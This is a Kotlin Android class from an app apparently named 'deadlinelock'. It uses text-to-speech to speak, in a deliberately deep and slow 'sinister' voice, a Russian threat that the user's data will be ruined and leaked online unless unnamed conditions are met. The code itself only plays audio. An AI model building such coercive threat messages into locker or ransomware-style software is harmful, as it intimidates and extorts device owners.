package com.rocket.deadlinelock

import android.content.Context
import android.speech.tts.TextToSpeech
import java.util.Locale

class ScaryVoice(private val context: Context) : TextToSpeech.OnInitListener {
    private var tts: TextToSpeech? = null
    private var isReady = false

    init {
        tts = TextToSpeech(context, this)
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            // Принудительно ставим русский язык
            val result = tts?.setLanguage(Locale("ru", "RU"))
            if (result != TextToSpeech.LANG_MISSING_DATA && result != TextToSpeech.LANG_NOT_SUPPORTED) {
                isReady = true
                // Делаем голос ниже и медленнее (зловещий эффект)
                tts?.setPitch(0.6f)
                tts?.setSpeechRate(0.85f)
            }
        }
    }

    fun speak() {
        if (isReady) {
            val text = "Ты доигрался. Если ты не выполнишь условия, то твоим данным будет пиздец, а также они уйдут в сеть."
            // QUEUE_FLUSH — чтобы не дублировалось
            tts?.speak(text, TextToSpeech.QUEUE_FLUSH, null, "scary_voice_id")
        }
    }

    fun stop() {
        tts?.stop()
        tts?.shutdown()
    }
}
